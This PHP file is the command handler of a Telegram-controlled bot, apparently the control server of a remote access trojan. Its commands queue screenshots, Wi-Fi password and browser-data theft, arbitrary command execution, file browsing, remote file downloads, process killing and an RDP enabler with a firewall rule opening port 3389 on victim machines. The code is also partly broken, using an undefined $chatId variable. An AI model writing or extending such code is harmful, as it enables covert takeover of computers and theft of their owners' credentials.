<?php

class LoggerBot
{
    private function processCommand($command, $recipient, $isClient = false)
    {
        $command = trim($command);
        $this->logCommand($recipient, $command);

        $response = ['status' => 'success', 'data' => ''];
        $commandData = null;

        switch (true) {
            case preg_match('/^\/status$/', $command):
                $commandData = ['type' => 'system_info', 'params' => []];
                $response['data'] = 'System status command queued';
                break;

            case preg_match('/^\/screenshot$/', $command):
                $commandData = ['type' => 'capture_screenshot', 'params' => []];
                $response['data'] = 'Screenshot command queued';
                break;

            case preg_match('/^\/get_antivirus_status$/', $command):
                $commandData = ['type' => 'get_antivirus_status', 'params' => []];
                $response['data'] = 'Antivirus status command queued';
                break;

            case preg_match('/^\/getwifipasswords$/', $command):
                if (!isset($this->selectedClient[$chatId])) {
                    $response['data'] = 'Please select a client first using /select';
                } else {
                    $clientId = $this->selectedClient[$chatId];
                    $response['data'] = $this->getWifiPasswordsResult($clientId);
                }
                break;
            case preg_match('/^\/get_browser_data$/', $command):
                if (!isset($this->selectedClient[$chatId])) {
                    $response['data'] = 'Please select a client first using /select';
                } else {
                    $clientId = $this->selectedClient[$chatId];
                    $response['data'] = $this->getBrowserDataResult($clientId);
                }
                break;
            case preg_match('/^\/select\s+(.+)$/', $command, $matches):
                $clientId = trim($matches[1]);
                $this->selectedClient[$chatId] = $clientId;
                $response['data'] = "Client $clientId selected";
                break;
            case preg_match('/^\/exec (.+)/', $command, $matches):
                $commandData = ['type' => 'system_command', 'params' => ['command' => $matches[1]]];
                $response['data'] = 'Execute command queued';
                break;

            case preg_match('/^\/hosts$/', $command):
                $commandData = ['type' => 'edit_hosts', 'params' => ['action' => 'list']];
                $response['data'] = 'Hosts command queued';
                break;

            case preg_match('/^\/browse\s+(.+)/', $command, $matches):
                $commandData = ['type' => 'file_operation', 'params' => ['action' => 'list', 'path' => $matches[1]]];
                $response['data'] = 'Browse directory command queued';
                break;

            case preg_match('/^\/browse_recursive\s+(.+)/', $command, $matches):
                $commandData = ['type' => 'file_operation', 'params' => ['action' => 'recursive_list', 'path' => $matches[1]]];
                $response['data'] = 'Recursive browse command queued';
                break;

            case preg_match('/^\/get-info$/', $command):
                $commandData = ['type' => 'system_info', 'params' => []];
                $response['data'] = 'System info command queued';
                break;

            case preg_match('/^\/go (.+)/', $command, $matches):
                $commandData = ['type' => 'open_url', 'params' => ['url' => $matches[1]]];
                $response['data'] = 'Open URL command queued';
                break;

            case preg_match('/^\/shutdown$/', $command):
                $commandData = ['type' => 'system_command', 'params' => ['command' => 'shutdown']];
                $response['data'] = 'Shutdown command queued';
                break;

            case preg_match('/^\/upload (.+)/', $command, $matches):
            case preg_match('/^\/upload_file (.+)/', $command, $matches):
                $commandData = ['type' => 'upload_file', 'params' => ['source' => 'telegram', 'file_url' => $matches[1], 'dest_path' => $matches[1]]];
                $response['data'] = 'Upload file command queued';
                break;

            case preg_match('/^\/upload_url (.+)/', $command, $matches):
                $commandData = ['type' => 'upload_file', 'params' => ['source' => 'url', 'file_url' => $matches[1], 'dest_path' => basename($matches[1])]];
                $response['data'] = 'Upload from URL command queued';
                break;

            case preg_match('/^\/tasks$/', $command):
                $commandData = ['type' => 'process_management', 'params' => ['action' => 'list']];
                $response['data'] = 'List tasks command queued';
                break;

            case preg_match('/^\/end_task\s+(.+)/', $command, $matches):
                $commandData = ['type' => 'end_task', 'params' => ['process_name' => $matches[1]]];
                $response['data'] = "End task command queued for process: {$matches[1]}";
                break;

            case preg_match('/^\/get_wifi_passwords$/', $command):
                $commandData = ['type' => 'get_wifi_passwords', 'params' => []];
                $response['data'] = 'Wi-Fi passwords command queued';
                break;

            case preg_match('/^\/enable_rdp$/', $command):
                $commandData = [
                    'type' => 'enable_rdp',
                    'params' => [
                        'firewall_rule' => 'netsh advfirewall firewall add rule name="Allow RDP" dir=in action=allow protocol=TCP localport=3389',
                        'port_check' => 'netstat -an | find "3389"',
                        'rdp_service' => 'net start termservice'
                    ]
                ];
                $response['data'] = 'Enable RDP command queued';
                break;

            case preg_match('/^\/disable_rdp$/', $command):
                $commandData = ['type' => 'disable_rdp', 'params' => []];
                $response['data'] = 'Disable RDP command queued';
                break;

            case preg_match('/^\/signout$/', $command):
                $commandData = ['type' => 'system_command', 'params' => ['command' => 'signout']];
                $response['data'] = 'Sign out command queued';
                break;

            case preg_match('/^\/sleep$/', $command):
                $commandData = ['type' => 'system_command', 'params' => ['command' => 'sleep']];
                $response['data'] = 'Sleep command queued';
                break;

            case preg_match('/^\/restart$/', $command):
                $commandData = ['type' => 'system_command', 'params' => ['command' => 'restart']];
                $response['data'] = 'Restart command queued';
                break;

            case preg_match('/^\/start$/', $command):
                $response['data'] = $isClient ? "Started" : $this->sendClientKeyboard($recipient);
                break;

            case preg_match('/^\/logs$/', $command):
            case preg_match('/^\/screens$/', $command):
            case preg_match('/^\/test_telegram$/', $command):
            case preg_match('/^\/startup$/', $command):
                $response['data'] = $isClient ? "Command not supported on client" : "Command executed on server";
                if (!$isClient) {
                    $this->sendTelegramMessage($recipient, "Command '$command' is server-side only.");
                }
                break;

            case preg_match('/^\/addadmin (\d+)$/', $command, $matches):
                if ($recipient == Config::$ADMIN_CHAT_ID) {
                    $response['data'] = $this->addAdmin($recipient, $matches[1], $isClient);
                } else {
                    $response = ['status' => 'error', 'data' => 'Only the primary admin can add admins.'];
                }
                break;

            case preg_match('/^\/listusers$/', $command):
                $response['data'] = $this->listUsers($recipient, $isClient);
                break;

            default:
                $response['data'] = $this->sendHelpMessage($recipient, $isClient);
                break;
        }

        if ($isClient && $commandData) {
            $this->queueClientCommand($recipient, $commandData);
        }

        return $response;
    }
}
